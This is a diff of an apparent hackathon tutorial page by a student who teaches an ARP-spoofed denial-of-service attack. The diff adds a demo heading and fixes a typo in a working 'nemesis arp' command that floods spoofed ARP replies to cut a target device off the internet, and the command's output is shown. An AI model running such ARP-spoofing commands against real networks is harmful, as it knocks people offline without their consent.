@@ -4,6 +4,8 @@ layout: default
 
 **Submission for 2022 NLMUSD Hackathon**  
 
+**Message for Live Demo**
+
 # Introduction
 Hello! I am Diego Contreras from John Glenn High School. I have been programming since I was in middle school, completely self-taught, and have a great deal in experience working with computers. This year's theme is to **teach something we are passionate about**. Personally, I am passionate about **hacking**. Because of how vast the field is, I'll teach you one small attack: `ARP-Spoofed DoS`. This specific attack allows you to completely block a device on a network from accessing the internet for as long as you'd like.
 
@@ -123,7 +125,7 @@ NOTE: This is the step that might not work with all routers. Some may have prote
 Here we will run the actual `nemesis` command:
 
 ```
-user@hackerman ~> sudo nemesis arp -c 10000 -i 1 -v -r -d wlp6s0 -S 192.168.1.1 -D 192.168.1.113 -h $60:14:B3:B9:DE:BD
+user@hackerman ~> sudo nemesis arp -c 10000 -i 1 -v -r -d wlp6s0 -S 192.168.1.1 -D 192.168.1.113 -h 60:14:B3:B9:DE:BD
 ARP/RARP Packet Injection -=- The NEMESIS Project v1.8
 
                [MAC] 60:14:B3:B9:DE:BD > F4:69:42:EC:F6:A8
